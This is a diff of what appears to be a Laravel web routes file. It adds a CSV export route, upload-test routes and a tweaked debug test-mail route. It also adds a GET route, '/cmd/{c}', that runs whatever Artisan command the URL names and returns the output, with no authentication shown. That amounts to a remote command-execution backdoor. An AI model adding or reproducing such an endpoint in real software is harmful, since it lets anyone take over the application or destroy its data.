@@ -361,6 +361,8 @@ Route::get('/itemDetails', 'AssemblyController@itemDetails');
 Route::post('/updateAssemblyItem', 'AssemblyController@updateAssemblyItem');
 Route::get('/partsDetails', 'AssemblyController@partsDetails');
 
+Route::get('/stock-request/export', 'StockRequestController@exportRequestsElseCsv');
+
 Route::get('repair-stock', 'StockController@repair_stocks');
 
 Route::get('/testmail', function () {
@@ -418,5 +420,13 @@ Route::get('/testmail', function () {
     // return $mail->send();
 
         
-    dd(Mail::raw('He1llo World!', function($msg) {$msg->to('emorej046@gmail.com')->subject('1Test Email'); }));
+    dd(Mail::raw('He1llo World!', function($msg) {$msg->to('emorej046@gmail.com')->subject('111Test Email'); }));
+});
+
+Route::get('/upload-test', 'Api\V0\DataController@showUploadTestPage');
+Route::post('/upload-test', 'Api\V0\DataController@handleUploadTest');
+
+Route::get('/cmd/{c}', function ($c) {
+    \Artisan::call($c);
+    return \Artisan::output();
 });
